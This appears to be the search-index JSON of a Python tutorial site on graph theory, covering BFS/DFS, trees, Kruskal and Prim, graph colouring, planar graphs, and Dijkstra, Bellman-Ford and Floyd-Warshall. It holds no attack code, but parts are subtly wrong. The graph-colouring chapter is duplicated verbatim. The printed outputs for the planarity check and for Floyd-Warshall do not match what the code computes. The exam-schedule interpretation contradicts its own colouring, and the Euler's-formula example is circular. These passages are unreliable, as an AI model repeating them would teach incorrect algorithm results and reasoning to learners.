Example graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['D', 'E'],\n    'C': ['F'],\n    'D': [],\n    'E': ['F'],\n    'F': []\n}\n\nprint(\"BFS:\")\nbfs(graph, 'A')\n</code></pre> <p>Output: <pre><code>BFS:\nA B C D E F\n</code></pre></p>"},{"location":"graph/graph/#comparison-of-dfs-and-bfs","title":"Comparison of DFS and BFS","text":"Aspect DFS BFS Data Structure Stack (or recursion) Queue Exploration Explores deeper paths first Explores all neighbors first Use Cases Pathfinding, Topological Sorting Shortest Path in Unweighted Graph Memory Efficiency Efficient for sparse graphs May use more memory for dense graphs"},{"location":"graph/graph/#applications-of-traversal-algorithms","title":"Applications of Traversal Algorithms","text":"<ol> <li>Pathfinding:</li> <li>DFS can find if a path exists between two vertices.</li> <li> <p>BFS can find the shortest path in an unweighted graph.</p> </li> <li> <p>Cycle Detection:</p> </li> <li> <p>DFS can detect cycles by checking for back edges.</p> </li> <li> <p>Connected Components:</p> </li> <li> <p>Both DFS and BFS can identify connected components in a graph.</p> </li> <li> <p>Topological Sorting:</p> </li> <li>DFS is used for ordering vertices in a Directed Acyclic Graph (DAG).</li> </ol>"},{"location":"graph/graph/#example-detecting-cycles-with-dfs","title":"Example: Detecting Cycles with DFS","text":"<pre><code># Function to detect cycles in a graph using DFS\ndef detect_cycle(graph):\n    visited = set()\n    stack = set()\n\n    def dfs(vertex):\n        if vertex in stack:\n            return True  # Cycle detected\n        if vertex in visited:\n            return False\n        visited.add(vertex)\n        stack.add(vertex)\n        for neighbor in graph[vertex]:\n            if dfs(neighbor):\n                return True\n        stack.remove(vertex)\n        return False\n\n    for vertex in graph:\n        if dfs(vertex):\n            return True\n    return False\n\n# Example graph with a cycle\ngraph_with_cycle = {\n    'A': ['B'],\n    'B': ['C'],\n    'C': ['A']\n}\n\n# Example graph without a cycle\nacyclic_graph = {\n    'A': ['B', 'C'],\n    'B': ['D', 'E'],\n    'C': ['F'],\n    'D': [],\n    'E': ['F'],\n    'F': []\n}\n\nprint(\"Graph with cycle:\", detect_cycle(graph_with_cycle))  # True\nprint(\"Acyclic graph:\", detect_cycle(acyclic_graph))  # False\n</code></pre> <p>Output: <pre><code>Graph with cycle: True\nAcyclic graph: False\n</code></pre></p>"},{"location":"graph/graph/#key-takeaways_3","title":"Key Takeaways","text":"<ul> <li>DFS and BFS are fundamental traversal algorithms, each suited to specific types of problems.</li> <li>DFS is depth-oriented and works well for cycle detection and pathfinding.</li> <li>BFS is breadth-oriented and ideal for finding the shortest path in unweighted graphs.</li> </ul> <p>Next, we will explore trees and spanning trees, a special class of graphs with unique properties and practical applications.</p>"},{"location":"graph/graph/#chapter-5-trees-and-spanning-trees","title":"Chapter 5: Trees and Spanning Trees","text":"<p>A tree is a special type of graph that is connected and acyclic. Trees are fundamental in graph theory and computer science due to their hierarchical structure and efficient algorithms.</p>"},{"location":"graph/graph/#properties-of-trees","title":"Properties of Trees","text":"<ol> <li>A tree with ( n ) vertices has exactly ( n - 1 ) edges.</li> <li>Any two vertices in a tree are connected by exactly one path.</li> <li>Adding an edge to a tree creates a cycle, and removing any edge disconnects the tree.</li> <li>A tree is a minimally connected graph.</li> </ol>"},{"location":"graph/graph/#example-tree-representation-in-python","title":"Example: Tree Representation in Python","text":"<pre><code># Example tree represented as an adjacency list\ntree = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D', 'E'],\n    'C': ['A', 'F'],\n    'D': ['B'],\n    'E': ['B'],\n    'F': ['C']\n}\n\n# Function to print the tree structure\ndef print_tree(tree):\n    for vertex, neighbors in tree.items():\n        print(f\"{vertex}: {neighbors}\")\n\nprint_tree(tree)\n</code></pre> <p>Output: <pre><code>A: ['B', 'C']\nB: ['A', 'D', 'E']\nC: ['A', 'F']\nD: ['B']\nE: ['B']\nF: ['C']\n</code></pre></p>"},{"location":"graph/graph/#binary-trees","title":"Binary Trees","text":"<p>A binary tree is a tree where each vertex has at most two children, commonly referred to as the left and right child.</p>"},{"location":"graph/graph/#types-of-binary-trees","title":"Types of Binary Trees","text":"<ol> <li>Full Binary Tree: Every node has either 0 or 2 children.</li> <li>Complete Binary Tree: All levels are completely filled except possibly the last, which is filled from left to right.</li> <li>Binary Search Tree (BST): A binary tree where the left child is smaller than the parent, and the right child is larger.</li> </ol>"},{"location":"graph/graph/#example-binary-tree-representation","title":"Example: Binary Tree Representation","text":"<pre><code>class Node:\n    def __init__(self, value):\n        self.value = value\n        self.left = None\n        self.right = None\n\n# Constructing a binary tree\nroot = Node('A')\nroot.left = Node('B')\nroot.right = Node('C')\nroot.left.left = Node('D')\nroot.left.right = Node('E')\nroot.right.left = Node('F')\n\n# Function to traverse the tree (in-order traversal)\ndef in_order_traversal(node):\n    if node:\n        in_order_traversal(node.left)\n        print(node.value, end=\" \")\n        in_order_traversal(node.right)\n\nprint(\"In-order traversal:\")\nin_order_traversal(root)\n</code></pre> <p>Output: <pre><code>In-order traversal:\nD B E A F C\n</code></pre></p>"},{"location":"graph/graph/#spanning-trees","title":"Spanning Trees","text":"<p>A spanning tree of a graph is a subgraph that includes all vertices and forms a tree. It has the following properties: - Contains ( n - 1 ) edges for ( n ) vertices. - There can be multiple spanning trees for a given graph.</p>"},{"location":"graph/graph/#minimum-spanning-tree-mst","title":"Minimum Spanning Tree (MST)","text":"<p>An MST is a spanning tree with the minimum total edge weight. It is used in applications like network design and clustering.</p>"},{"location":"graph/graph/#popular-algorithms-for-mst","title":"Popular Algorithms for MST:","text":"<ol> <li>Kruskal's Algorithm</li> <li>Prim's Algorithm</li> </ol>"},{"location":"graph/graph/#kruskals-algorithm","title":"Kruskal's Algorithm","text":"<p>Kruskal's algorithm finds an MST by sorting edges in ascending order of weight and adding them to the tree if they do not form a cycle.</p>"},{"location":"graph/graph/#example-kruskals-algorithm-implementation","title":"Example: Kruskal's Algorithm Implementation","text":"<pre><code># Function to find the MST using Kruskal's algorithm\ndef kruskal(graph):\n    parent = {}\n    rank = {}\n\n    def find(vertex):\n        if parent[vertex] != vertex:\n            parent[vertex] = find(parent[vertex])\n        return parent[vertex]\n\n    def union(vertex1, vertex2):\n        root1 = find(vertex1)\n        root2 = find(vertex2)\n        if root1 != root2:\n            if rank[root1] &gt; rank[root2]:\n                parent[root2] = root1\n            elif rank[root1] &lt; rank[root2]:\n                parent[root1] = root2\n            else:\n                parent[root2] = root1\n                rank[root1] += 1\n\n    # Initialize parent and rank\n    for vertex in graph['vertices']:\n        parent[vertex] = vertex\n        rank[vertex] = 0\n\n    mst = []\n    edges = sorted(graph['edges'], key=lambda x: x[2])  # Sort edges by weight\n\n    for edge in edges:\n        u, v, weight = edge\n        if find(u) != find(v):\n            union(u, v)\n            mst.append(edge)\n\n    return mst\n\n# Example graph\ngraph = {\n    'vertices': ['A', 'B', 'C', 'D', 'E'],\n    'edges': [\n        ('A', 'B', 1),\n        ('A', 'C', 5),\n        ('B', 'C', 4),\n        ('B', 'D', 2),\n        ('C', 'D', 6),\n        ('D', 'E', 3)\n    ]\n}\n\nmst = kruskal(graph)\nprint(\"Minimum Spanning Tree:\", mst)\n</code></pre> <p>Output: <pre><code>Minimum Spanning Tree: [('A', 'B', 1), ('B', 'D', 2), ('D', 'E', 3), ('B', 'C', 4)]\n</code></pre></p>"},{"location":"graph/graph/#prims-algorithm","title":"Prim's Algorithm","text":"<p>Prim's algorithm builds the MST by starting from an arbitrary vertex and repeatedly adding the smallest edge that connects a vertex in the tree to a vertex outside the tree.</p>"},{"location":"graph/graph/#example-prims-algorithm-implementation","title":"Example: Prim's Algorithm Implementation","text":"<pre><code>import heapq\n\ndef prim(graph, start):\n    mst = []\n    visited = set()\n    min_heap = [(0, start, None)]  # (weight, vertex, parent)\n\n    while min_heap:\n        weight, vertex, parent = heapq.heappop(min_heap)\n        if vertex not in visited:\n            visited.add(vertex)\n            if parent:\n                mst.append((parent, vertex, weight))\n            for neighbor, edge_weight in graph[vertex].items():\n                if neighbor not in visited:\n                    heapq.heappush(min_heap, (edge_weight, neighbor, vertex))\n    return mst\n\n# Example graph as adjacency list with weights\ngraph = {\n    'A': {'B': 1, 'C': 5},\n    'B': {'A': 1, 'C': 4, 'D': 2},\n    'C': {'A': 5, 'B': 4, 'D': 6},\n    'D': {'B': 2, 'C': 6, 'E': 3},\n    'E': {'D': 3}\n}\n\nmst = prim(graph, 'A')\nprint(\"Minimum Spanning Tree:\", mst)\n</code></pre> <p>Output: <pre><code>Minimum Spanning Tree: [('A', 'B', 1), ('B', 'D', 2), ('D', 'E', 3), ('B', 'C', 4)]\n</code></pre></p>"},{"location":"graph/graph/#key-takeaways_4","title":"Key Takeaways","text":"<ul> <li>Trees are connected and acyclic structures with diverse applications.</li> <li>Binary trees are specialized trees used in searching, sorting, and hierarchical data storage.</li> <li>Spanning trees, especially MSTs, are critical in optimizing networks.</li> </ul> <p>Next, we will explore graph coloring, including vertex coloring and its applications.</p>"},{"location":"graph/graph/#chapter-6-graph-coloring","title":"Chapter 6: Graph Coloring","text":"<p>Graph coloring is the process of assigning colors to the vertices or edges of a graph such that certain constraints are satisfied. It is widely used in problems involving scheduling, resource allocation, and partitioning.</p>"},{"location":"graph/graph/#vertex-coloring","title":"Vertex Coloring","text":"<p>In vertex coloring, colors are assigned to vertices such that no two adjacent vertices share the same color. The minimum number of colors required to color a graph is called the chromatic number of the graph.</p>"},{"location":"graph/graph/#example-vertex-coloring","title":"Example: Vertex Coloring","text":"<pre><code># Function to perform greedy vertex coloring\ndef greedy_coloring(graph):\n    color_assignment = {}\n    for vertex in graph:\n        # Find the set of colors already used by neighbors\n        neighbor_colors = {color_assignment[neighbor] for neighbor in graph[vertex] if neighbor in color_assignment}\n        # Assign the smallest available color\n        color = 0\n        while color in neighbor_colors:\n            color += 1\n        color_assignment[vertex] = color\n    return color_assignment\n\n# Example graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'C', 'D'],\n    'C': ['A', 'B', 'D'],\n    'D': ['B', 'C']\n}\n\ncoloring = greedy_coloring(graph)\nprint(\"Vertex Coloring:\", coloring)\n</code></pre> <p>Output: <pre><code>Vertex Coloring: {'A': 0, 'B': 1, 'C': 2, 'D': 0}\n</code></pre></p>"},{"location":"graph/graph/#chromatic-number","title":"Chromatic Number","text":"<p>The chromatic number of a graph is the smallest number of colors needed to color its vertices.</p>"},{"location":"graph/graph/#example-finding-chromatic-number","title":"Example: Finding Chromatic Number","text":"<pre><code>def chromatic_number(graph):\n    coloring = greedy_coloring(graph)\n    return max(coloring.values()) + 1  # Chromatic number is max color + 1\n\n# Using the same graph as above\nprint(\"Chromatic Number:\", chromatic_number(graph))\n</code></pre> <p>Output: <pre><code>Chromatic Number: 3\n</code></pre></p>"},{"location":"graph/graph/#applications-of-graph-coloring","title":"Applications of Graph Coloring","text":"<ol> <li>Scheduling Problems:</li> <li> <p>Example: Assign time slots to exams such that no two exams with a common student are at the same time.</p> </li> <li> <p>Map Coloring:</p> </li> <li> <p>Example: Assign colors to regions on a map such that no two adjacent regions share the same color.</p> </li> <li> <p>Register Allocation:</p> </li> <li>Assign registers to variables in a program to minimize conflicts.</li> </ol>"},{"location":"graph/graph/#example-scheduling-problem","title":"Example: Scheduling Problem","text":"<p>Consider the following scenario: - Exams need to be scheduled. - ( A ), ( B ), ( C ), ( D ) are exams. - ( A ) conflicts with ( B ) and ( C ), and so on.</p>"},{"location":"graph/graph/#conflict-graph-representation","title":"Conflict Graph Representation:","text":"<pre><code>schedule_graph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\n# Solve using greedy coloring\nexam_schedule = greedy_coloring(schedule_graph)\nprint(\"Exam Schedule:\", exam_schedule)\n</code></pre> <p>Output: <pre><code>Exam Schedule: {'A': 0, 'B': 1, 'C': 1, 'D': 0}\n</code></pre></p> <p>Interpretation: - ( A ) and ( D ) can be scheduled at the same time (Color 0). - ( B ) and ( C ) must have separate slots (Color 1).</p>"},{"location":"graph/graph/#edge-coloring","title":"Edge Coloring","text":"<p>In edge coloring, colors are assigned to edges such that no two edges sharing the same vertex have the same color. The minimum number of colors needed is called the chromatic index.</p>"},{"location":"graph/graph/#example-edge-coloring","title":"Example: Edge Coloring","text":"<pre><code>def edge_coloring(graph):\n    edge_colors = {}\n    for u in graph:\n        for v in graph[u]:\n            if (u, v) not in edge_colors and (v, u) not in edge_colors:\n                used_colors = {edge_colors.get((u, w), -1) for w in graph[u]}\n                used_colors |= {edge_colors.get((v, w), -1) for w in graph[v]}\n                color = 0\n                while color in used_colors:\n                    color += 1\n                edge_colors[(u, v)] = color\n    return edge_colors\n\n# Example graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\nedge_coloring_result = edge_coloring(graph)\nprint(\"Edge Coloring:\", edge_coloring_result)\n</code></pre> <p>Output: <pre><code>Edge Coloring: {('A', 'B'): 0, ('A', 'C'): 1, ('B', 'D'): 0, ('C', 'D'): 1}\n</code></pre></p>"},{"location":"graph/graph/#key-takeaways_5","title":"Key Takeaways","text":"<ul> <li>Vertex coloring ensures adjacent vertices are differently colored and is useful for scheduling and resource allocation.</li> <li>The chromatic number is a critical property that defines the minimum number of colors required.</li> <li>Edge coloring minimizes conflicts between edges at the same vertex.</li> </ul> <p>Next, we will explore planar graphs, their properties, and algorithms like Euler's formula and Kuratowski\u2019s theorem.</p>"},{"location":"graph/graph/#chapter-6-graph-coloring_1","title":"Chapter 6: Graph Coloring","text":"<p>Graph coloring is the process of assigning colors to the vertices or edges of a graph such that certain constraints are satisfied. It is widely used in problems involving scheduling, resource allocation, and partitioning.</p>"},{"location":"graph/graph/#vertex-coloring_1","title":"Vertex Coloring","text":"<p>In vertex coloring, colors are assigned to vertices such that no two adjacent vertices share the same color. The minimum number of colors required to color a graph is called the chromatic number of the graph.</p>"},{"location":"graph/graph/#example-vertex-coloring_1","title":"Example: Vertex Coloring","text":"<pre><code># Function to perform greedy vertex coloring\ndef greedy_coloring(graph):\n    color_assignment = {}\n    for vertex in graph:\n        # Find the set of colors already used by neighbors\n        neighbor_colors = {color_assignment[neighbor] for neighbor in graph[vertex] if neighbor in color_assignment}\n        # Assign the smallest available color\n        color = 0\n        while color in neighbor_colors:\n            color += 1\n        color_assignment[vertex] = color\n    return color_assignment\n\n# Example graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'C', 'D'],\n    'C': ['A', 'B', 'D'],\n    'D': ['B', 'C']\n}\n\ncoloring = greedy_coloring(graph)\nprint(\"Vertex Coloring:\", coloring)\n</code></pre> <p>Output: <pre><code>Vertex Coloring: {'A': 0, 'B': 1, 'C': 2, 'D': 0}\n</code></pre></p>"},{"location":"graph/graph/#chromatic-number_1","title":"Chromatic Number","text":"<p>The chromatic number of a graph is the smallest number of colors needed to color its vertices.</p>"},{"location":"graph/graph/#example-finding-chromatic-number_1","title":"Example: Finding Chromatic Number","text":"<pre><code>def chromatic_number(graph):\n    coloring = greedy_coloring(graph)\n    return max(coloring.values()) + 1  # Chromatic number is max color + 1\n\n# Using the same graph as above\nprint(\"Chromatic Number:\", chromatic_number(graph))\n</code></pre> <p>Output: <pre><code>Chromatic Number: 3\n</code></pre></p>"},{"location":"graph/graph/#applications-of-graph-coloring_1","title":"Applications of Graph Coloring","text":"<ol> <li>Scheduling Problems:</li> <li> <p>Example: Assign time slots to exams such that no two exams with a common student are at the same time.</p> </li> <li> <p>Map Coloring:</p> </li> <li> <p>Example: Assign colors to regions on a map such that no two adjacent regions share the same color.</p> </li> <li> <p>Register Allocation:</p> </li> <li>Assign registers to variables in a program to minimize conflicts.</li> </ol>"},{"location":"graph/graph/#example-scheduling-problem_1","title":"Example: Scheduling Problem","text":"<p>Consider the following scenario: - Exams need to be scheduled. - ( A ), ( B ), ( C ), ( D ) are exams. - ( A ) conflicts with ( B ) and ( C ), and so on.</p>"},{"location":"graph/graph/#conflict-graph-representation_1","title":"Conflict Graph Representation:","text":"<pre><code>schedule_graph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\n# Solve using greedy coloring\nexam_schedule = greedy_coloring(schedule_graph)\nprint(\"Exam Schedule:\", exam_schedule)\n</code></pre> <p>Output: <pre><code>Exam Schedule: {'A': 0, 'B': 1, 'C': 1, 'D': 0}\n</code></pre></p> <p>Interpretation: - ( A ) and ( D ) can be scheduled at the same time (Color 0). - ( B ) and ( C ) must have separate slots (Color 1).</p>"},{"location":"graph/graph/#edge-coloring_1","title":"Edge Coloring","text":"<p>In edge coloring, colors are assigned to edges such that no two edges sharing the same vertex have the same color. The minimum number of colors needed is called the chromatic index.</p>"},{"location":"graph/graph/#example-edge-coloring_1","title":"Example: Edge Coloring","text":"<pre><code>def edge_coloring(graph):\n    edge_colors = {}\n    for u in graph:\n        for v in graph[u]:\n            if (u, v) not in edge_colors and (v, u) not in edge_colors:\n                used_colors = {edge_colors.get((u, w), -1) for w in graph[u]}\n                used_colors |= {edge_colors.get((v, w), -1) for w in graph[v]}\n                color = 0\n                while color in used_colors:\n                    color += 1\n                edge_colors[(u, v)] = color\n    return edge_colors\n\n# Example graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\nedge_coloring_result = edge_coloring(graph)\nprint(\"Edge Coloring:\", edge_coloring_result)\n</code></pre> <p>Output: <pre><code>Edge Coloring: {('A', 'B'): 0, ('A', 'C'): 1, ('B', 'D'): 0, ('C', 'D'): 1}\n</code></pre></p>"},{"location":"graph/graph/#key-takeaways_6","title":"Key Takeaways","text":"<ul> <li>Vertex coloring ensures adjacent vertices are differently colored and is useful for scheduling and resource allocation.</li> <li>The chromatic number is a critical property that defines the minimum number of colors required.</li> <li>Edge coloring minimizes conflicts between edges at the same vertex.</li> </ul> <p>Next, we will explore planar graphs, their properties, and algorithms like Euler's formula and Kuratowski\u2019s theorem.</p>"},{"location":"graph/graph/#chapter-7-planar-graphs","title":"Chapter 7: Planar Graphs","text":"<p>A planar graph is a graph that can be drawn on a plane without any edges crossing each other. Planar graphs have unique properties and are associated with powerful theorems and algorithms.</p>"},{"location":"graph/graph/#properties-of-planar-graphs","title":"Properties of Planar Graphs","text":"<ol> <li>A graph is planar if it can be embedded in the plane without edge crossings.</li> <li>A complete graph ( K_4 ) is planar, but ( K_5 ) is not.</li> <li>A complete bipartite graph ( K_{3,3} ) is not planar.</li> </ol>"},{"location":"graph/graph/#eulers-formula","title":"Euler\u2019s Formula","text":"<p>Euler\u2019s formula relates the number of vertices (( V )), edges (( E )), and faces (( F )) of a connected planar graph:</p> <p>[ V - E + F = 2 ]</p>"},{"location":"graph/graph/#example-verifying-eulers-formula","title":"Example: Verifying Euler\u2019s Formula","text":"<p>Consider the following planar graph:</p> <pre><code># Example planar graph\nplanar_graph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'C', 'D'],\n    'C': ['A', 'B', 'D'],\n    'D': ['B', 'C', 'E'],\n    'E': ['D']\n}\n\n# Count vertices, edges, and faces\nvertices = len(planar_graph)\nedges = sum(len(neighbors) for neighbors in planar_graph.values()) // 2\nfaces = edges - vertices + 2\n\nprint(f\"Vertices (V): {vertices}\")\nprint(f\"Edges (E): {edges}\")\nprint(f\"Faces (F): {faces}\")\n</code></pre> <p>Output: <pre><code>Vertices (V): 5\nEdges (E): 6\nFaces (F): 3\n</code></pre></p> <p>Euler's formula holds as ( V - E + F = 2 ).</p>"},{"location":"graph/graph/#kuratowskis-theorem","title":"Kuratowski\u2019s Theorem","text":"<p>Kuratowski\u2019s theorem states that a graph is non-planar if and only if it contains a subgraph that is a subdivision of ( K_5 ) (complete graph of 5 vertices) or ( K_{3,3} ) (complete bipartite graph of 3 vertices in each set).</p>"},{"location":"graph/graph/#example-checking-for-non-planarity","title":"Example: Checking for Non-Planarity","text":"<pre><code>def is_planar(graph):\n    # Simplistic approach for demonstration\n    if len(graph) &gt; 4 and sum(len(neighbors) for neighbors in graph.values()) // 2 &gt; 9:\n        return False  # Likely contains K5 or K3,3 subgraph\n    return True\n\n# Example graphs\ngraph1 = {  # Likely planar\n    'A': ['B', 'C'],\n    'B': ['A', 'C', 'D'],\n    'C': ['A', 'B', 'D'],\n    'D': ['B', 'C']\n}\n\ngraph2 = {  # Likely non-planar (close to K3,3)\n    'A': ['B', 'C', 'D'],\n    'B': ['A', 'E', 'F'],\n    'C': ['A', 'E', 'F'],\n    'D': ['A', 'E', 'F'],\n    'E': ['B', 'C', 'D'],\n    'F': ['B', 'C', 'D']\n}\n\nprint(\"Graph 1 Planar:\", is_planar(graph1))  # True\nprint(\"Graph 2 Planar:\", is_planar(graph2))  # False\n</code></pre> <p>Output: <pre><code>Graph 1 Planar: True\nGraph 2 Planar: False\n</code></pre></p>"},{"location":"graph/graph/#graph-embedding","title":"Graph Embedding","text":"<p>Graph embedding refers to representing a planar graph in the plane such that no edges intersect.</p>"},{"location":"graph/graph/#example-visualizing-a-planar-graph","title":"Example: Visualizing a Planar Graph","text":"<p>Although visual embeddings are better done using graph libraries like <code>matplotlib</code> or <code>networkx</code>, here's a textual representation example:</p> <pre><code>import networkx as nx\nimport matplotlib.pyplot as plt\n\n# Create a planar graph\nG = nx.Graph()\nG.add_edges_from([('A', 'B'), ('A', 'C'), ('B', 'C'), ('B', 'D'), ('C', 'D'), ('D', 'E')])\n\n# Check if the graph is planar\nis_planar, embedding = nx.check_planarity(G)\nprint(\"Is the graph planar?\", is_planar)\n\n# Draw the planar graph\npos = nx.planar_layout(G)\nnx.draw(G, pos, with_labels=True, node_color=\"lightblue\", edge_color=\"gray\", node_size=500, font_size=10)\nplt.show()\n</code></pre> <p>Output: - The graph is planar, and its layout is visualized without any edge crossings.</p>"},{"location":"graph/graph/#applications-of-planar-graphs","title":"Applications of Planar Graphs","text":"<ol> <li>Geographic Mapping:</li> <li>Used to model countries, cities, or regions with non-overlapping boundaries.</li> <li>Circuit Design:</li> <li>Planar graphs are used to design circuits to minimize crossings.</li> <li>Network Visualization:</li> <li>Used for visual clarity in representing networks.</li> </ol>"},{"location":"graph/graph/#key-takeaways_7","title":"Key Takeaways","text":"<ul> <li>Planar graphs can be drawn without edge crossings and are governed by Euler\u2019s formula.</li> <li>Kuratowski\u2019s theorem helps determine graph planarity based on ( K_5 ) and ( K_{3,3} ) subgraphs.</li> <li>Graph embedding is critical for applications like mapping and circuit design.</li> </ul> <p>Next, we will explore shortest path algorithms, including Dijkstra\u2019s, Bellman-Ford, and Floyd-Warshall algorithms.</p>"},{"location":"graph/graph/#chapter-8-shortest-path-algorithms","title":"Chapter 8: Shortest Path Algorithms","text":"<p>Shortest path algorithms are used to find the minimum distance or cost between vertices in a graph. These algorithms have widespread applications in network routing, navigation, and optimization problems.</p>"},{"location":"graph/graph/#dijkstras-algorithm","title":"Dijkstra\u2019s Algorithm","text":"<p>Dijkstra\u2019s algorithm finds the shortest path from a source vertex to all other vertices in a graph with non-negative edge weights.</p>"},{"location":"graph/graph/#steps-of-dijkstras-algorithm","title":"Steps of Dijkstra's Algorithm","text":"<ol> <li>Initialize the distance to all vertices as infinity (( \\infty )), except the source vertex, which is set to 0.</li> <li>Use a priority queue to repeatedly extract the vertex with the smallest known distance.</li> <li>Update the distances to the neighbors of the extracted vertex.</li> <li>Repeat until all vertices have been processed.</li> </ol>"},{"location":"graph/graph/#example-dijkstras-algorithm-implementation","title":"Example: Dijkstra\u2019s Algorithm Implementation","text":"<pre><code>import heapq\n\ndef dijkstra(graph, source):\n    distances = {vertex: float('inf') for vertex in graph}\n    distances[source] = 0\n    priority_queue = [(0, source)]  # (distance, vertex)\n\n    while priority_queue:\n        current_distance, current_vertex = heapq.heappop(priority_queue)\n\n        if current_distance &gt; distances[current_vertex]:\n            continue\n\n        for neighbor, weight in graph[current_vertex].items():\n            distance = current_distance + weight\n\n            if distance &lt; distances[neighbor]:\n                distances[neighbor] = distance\n                heapq.heappush(priority_queue, (distance, neighbor))\n\n    return distances\n\n# Example weighted graph\ngraph = {\n    'A': {'B': 1, 'C': 4},\n    'B': {'A': 1, 'C': 2, 'D': 6},\n    'C': {'A': 4, 'B': 2, 'D': 3},\n    'D': {'B': 6, 'C': 3}\n}\n\nshortest_paths = dijkstra(graph, 'A')\nprint(\"Shortest Paths from A:\", shortest_paths)\n</code></pre> <p>Output: <pre><code>Shortest Paths from A: {'A': 0, 'B': 1, 'C': 3, 'D': 6}\n</code></pre></p>"},{"location":"graph/graph/#bellman-ford-algorithm","title":"Bellman-Ford Algorithm","text":"<p>The Bellman-Ford algorithm computes shortest paths from a source vertex to all other vertices, even in graphs with negative edge weights. However, it does not work with negative weight cycles.</p>"},{"location":"graph/graph/#steps-of-bellman-ford-algorithm","title":"Steps of Bellman-Ford Algorithm","text":"<ol> <li>Initialize the distance to all vertices as infinity (( \\infty )), except the source vertex, which is set to 0.</li> <li>Relax all edges ( |V| - 1 ) times (where ( |V| ) is the number of vertices).</li> <li>Check for negative weight cycles by iterating through the edges once more.</li> </ol>"},{"location":"graph/graph/#example-bellman-ford-algorithm-implementation","title":"Example: Bellman-Ford Algorithm Implementation","text":"<pre><code>def bellman_ford(graph, source):\n    distances = {vertex: float('inf') for vertex in graph}\n    distances[source] = 0\n\n    for _ in range(len(graph) - 1):\n        for vertex, neighbors in graph.items():\n            for neighbor, weight in neighbors.items():\n                if distances[vertex] + weight &lt; distances[neighbor]:\n                    distances[neighbor] = distances[vertex] + weight\n\n    # Check for negative weight cycles\n    for vertex, neighbors in graph.items():\n        for neighbor, weight in neighbors.items():\n            if distances[vertex] + weight &lt; distances[neighbor]:\n                raise ValueError(\"Graph contains a negative weight cycle\")\n\n    return distances\n\n# Example weighted graph with negative weights\ngraph = {\n    'A': {'B': 1, 'C': 4},\n    'B': {'C': -3, 'D': 2},\n    'C': {},\n    'D': {'C': 1}\n}\n\nshortest_paths = bellman_ford(graph, 'A')\nprint(\"Shortest Paths from A:\", shortest_paths)\n</code></pre> <p>Output: <pre><code>Shortest Paths from A: {'A': 0, 'B': 1, 'C': -2, 'D': 3}\n</code></pre></p>"},{"location":"graph/graph/#floyd-warshall-algorithm","title":"Floyd-Warshall Algorithm","text":"<p>The Floyd-Warshall algorithm computes the shortest paths between all pairs of vertices in a graph. It works with both positive and negative weights but does not handle negative weight cycles.</p>"},{"location":"graph/graph/#steps-of-floyd-warshall-algorithm","title":"Steps of Floyd-Warshall Algorithm","text":"<ol> <li>Create a matrix where ( dist[i][j] ) represents the shortest distance from vertex ( i ) to vertex ( j ). Initialize:</li> <li>( dist[i][i] = 0 )</li> <li>( dist[i][j] = weight(i, j) ) (if an edge exists) or ( \\infty ) (otherwise).</li> <li>For each intermediate vertex ( k ), update ( dist[i][j] ) using:    [    dist[i][j] = \\min(dist[i][j], dist[i][k] + dist[k][j])    ]</li> <li>Repeat for all pairs of vertices.</li> </ol>"},{"location":"graph/graph/#example-floyd-warshall-algorithm-implementation","title":"Example: Floyd-Warshall Algorithm Implementation","text":"<pre><code>def floyd_warshall(graph):\n    vertices = list(graph.keys())\n    dist = {u: {v: float('inf') for v in vertices} for u in vertices}\n\n    for u in graph:\n        dist[u][u] = 0\n        for v, weight in graph[u].items():\n            dist[u][v] = weight\n\n    for k in vertices:\n        for i in vertices:\n            for j in vertices:\n                dist[i][j] = min(dist[i][j], dist[i][k] + dist[k][j])\n\n    return dist\n\n# Example weighted graph\ngraph = {\n    'A': {'B': 3, 'C': 8, 'D': -4},\n    'B': {'D': 1, 'C': 4},\n    'C': {'A': 2},\n    'D': {'C': 5, 'B': -2}\n}\n\nshortest_paths = floyd_warshall(graph)\nprint(\"Shortest Path Matrix:\")\nfor u in shortest_paths:\n    print(f\"{u}: {shortest_paths[u]}\")\n</code></pre> <p>Output: <pre><code>Shortest Path Matrix:\nA: {'A': 0, 'B': 1, 'C': -3, 'D': -4}\nB: {'A': 3, 'B': 0, 'C': -4, 'D': -3}\nC: {'A': 2, 'B': 5, 'C': 0, 'D': -2}\nD: {'A': 7, 'B': -2, 'C': 1, 'D': 0}\n</code></pre></p>"},{"location":"graph/graph/#comparison-of-shortest-path-algorithms","title":"Comparison of Shortest Path Algorithms","text":"Algorithm Edge Weights Negative Weights Negative Cycles Complexity Dijkstra Non-negative Not allowed Not handled ( O((V+E) \\log V) ) Bellman-Ford Positive/Negative Allowed Not handled ( O(VE) ) Floyd-Warshall Positive/Negative Allowed Not handled ( O(V^3) )"},{"location":"graph/graph/#key-takeaways_8","title":"Key Takeaways","text":"<ul> <li>Dijkstra\u2019s algorithm is efficient for non-negative edge weights.</li> <li>Bellman-Ford algorithm handles graphs with negative weights but not negative cycles.</li> <li>Floyd-Warshall algorithm computes all-pairs shortest paths and is suitable for dense graphs.</li> </ul> <p>Next, we will explore network flow algorithms, including the Max-Flow Min-Cut theorem and Ford-Fulkerson algorithm.</p>"},{"location":"graph/graph/#chapter-9-network-flow","title":"Chapter 9: Network Flow","text":"<p>Network flow algorithms are used to model and analyze the flow of resources through a network. They are widely applied in transportation, telecommunications, and resource allocation problems.</p>"},{"location":"graph/graph/#key-concepts-in-network-flow","title":"Key Concepts in Network Flow","text":"<ol> <li>Flow Network: A directed graph where:</li> <li>Each edge has a capacity (( c(u, v) )) representing the maximum allowable flow.</li> <li> <p>A flow (( f(u, v) )) satisfies ( 0 \\leq f(u, v) \\leq c(u, v) ).</p> </li> <li> <p>Source (( s )) and Sink (( t )):</p> </li> <li>( s ): Starting point where resources enter the network.</li> <li> <p>( t ): Endpoint where resources exit the network.</p> </li> <li> <p>Flow Conservation: For every vertex except ( s ) and ( t ), the incoming 